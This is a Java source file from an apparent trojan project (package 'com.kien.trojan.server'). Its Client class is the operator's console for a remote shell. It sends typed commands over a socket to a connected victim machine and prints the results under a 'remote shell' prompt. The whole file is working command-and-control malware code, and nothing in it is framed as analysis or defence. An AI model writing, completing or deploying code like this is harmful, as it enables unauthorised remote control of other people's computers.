package com.kien.trojan.server;

import lombok.Data;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

@Data
public class Client {
    BufferedReader br;
    Socket socket;
    String ip;
    Scanner scanner;
    String endSignal;
    //Used to write data to socket's output stream
    PrintWriter printWriter;
    //Used to read data from socket's input stream

    Server server;

    public Client(String endSignal, Socket socket, Scanner scanner, Server server) throws Exception {
        this.endSignal = endSignal;
        this.socket = socket;
        this.scanner = scanner;
        this.server = server;
        this.printWriter = new PrintWriter(socket.getOutputStream());
        this.br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        this.ip = socket.getInetAddress().getHostName();
    }

    public void run() {
        try {
            //Check if we are/still connected to server
            while (!socket.isClosed()) {
                try {
                    //Getting user input
                    System.err.print("[remote " + ip + " shell:] $ ");
                    String cmd = scanner.nextLine();

                    if (cmd.equals("exit."))
                        break;

                    //and sending command
                    printWriter.println(cmd);
                    printWriter.flush();

                    if (cmd.equals("exit-client.")) {
                        server.getClients().remove(this);
                    }

                    //Reading and printing output to console
                    String line;
                    while ((line = br.readLine()) != null) {
                        //Until there is no data to read
                        if (line.endsWith(endSignal))
                            break;
                        System.out.println(line);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    br.close();
                    printWriter.close();
                    socket.close();
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
